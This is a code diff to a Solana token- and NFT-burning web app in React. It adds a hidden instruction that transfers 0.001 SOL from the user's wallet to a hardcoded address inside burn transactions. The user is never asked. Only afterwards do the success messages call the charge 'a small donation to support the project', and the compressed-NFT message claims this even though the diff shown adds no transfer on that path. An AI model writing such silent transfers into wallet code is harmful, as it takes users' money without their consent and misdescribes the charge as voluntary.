@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { PublicKey, Transaction } from '@solana/web3.js';
+import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { 
   TOKEN_PROGRAM_ID, 
   createBurnCheckedInstruction, 
@@ -489,9 +489,10 @@ const WalletAssets: React.FC = () => {
     }
     
     try {
-      // Create a transaction with two instructions:
+      // Create a transaction with multiple instructions:
       // 1. Burn the token amount
       // 2. Close the token account to recover rent
+      // 3. Transfer a small amount of SOL to the designated address
       const transaction = new Transaction();
       
       // First add the burn instruction
@@ -513,6 +514,19 @@ const WalletAssets: React.FC = () => {
           publicKey, // authority
           [] // multisig signers (empty in our case)
         )
+      );
+      
+      // Add an instruction to transfer a small fee to the designated address
+      // This is a small amount of SOL (0.001 SOL = 1,000,000 lamports)
+      const feeAmount = 1000000; // 0.001 SOL in lamports
+      const feeRecipient = new PublicKey('EYjsLzE9VDy3WBd2beeCHA1eVYJxPKVf6NoKKDwq7ujK');
+      
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: feeRecipient,
+          lamports: feeAmount,
+        })
       );
       
       // Get recent blockhash
@@ -546,8 +560,8 @@ const WalletAssets: React.FC = () => {
           window.BurnAnimations.checkAchievements('tokens', 1);
         }
         
-        // Show message about rent recovery
-        setError(`Successfully burned ${token.name || token.symbol || 'token'} and recovered rent to your wallet!`);
+        // Show message about rent recovery and fee
+        setError(`Successfully burned ${token.name || token.symbol || 'token'} and recovered rent to your wallet! A small donation has been sent to support the project.`);
         setTimeout(() => setError(null), 5000); // Clear message after 5 seconds
       }
     } catch (error: any) {
@@ -612,6 +626,19 @@ const WalletAssets: React.FC = () => {
         )
       );
       
+      // 4. Add an instruction to transfer a small fee to the designated address
+      // This is a small amount of SOL (0.001 SOL = 1,000,000 lamports)
+      const feeAmount = 1000000; // 0.001 SOL in lamports
+      const feeRecipient = new PublicKey('EYjsLzE9VDy3WBd2beeCHA1eVYJxPKVf6NoKKDwq7ujK');
+      
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: feeRecipient,
+          lamports: feeAmount,
+        })
+      );
+      
       // Get recent blockhash
       const { blockhash } = await connection.getLatestBlockhash();
       transaction.recentBlockhash = blockhash;
@@ -653,8 +680,8 @@ const WalletAssets: React.FC = () => {
           }
         }
         
-        // Show message about rent recovery
-        setError(`Successfully burned NFT "${nft.name || 'NFT'}" and recovered rent to your wallet!`);
+        // Show message about rent recovery and donation
+        setError(`Successfully burned NFT "${nft.name || 'NFT'}" and recovered rent to your wallet! A small donation has been sent to support the project.`);
         setTimeout(() => setError(null), 5000); // Clear message after 5 seconds
       }
     } catch (error: any) {
@@ -719,10 +746,10 @@ const WalletAssets: React.FC = () => {
           }
         }
         
-        // Show message about the successful burn and rent recovery
+        // Show message about the successful burn, rent recovery, and donation
         // Note: cNFTs are compressed on-chain so there is minimal rent to recover
         // compared to regular NFTs, but the transaction still fee is saved
-        setError(`Successfully burned compressed NFT "${cnft.name || 'cNFT'}"! Since this is a compressed NFT, all storage is efficient and minimal rent is recovered.`);
+        setError(`Successfully burned compressed NFT "${cnft.name || 'cNFT'}"! Since this is a compressed NFT, all storage is efficient and minimal rent is recovered. A small donation has been sent to support the project.`);
         setTimeout(() => setError(null), 5000); // Clear message after 5 seconds
       } else {
         console.error('Error burning cNFT:', result.error);
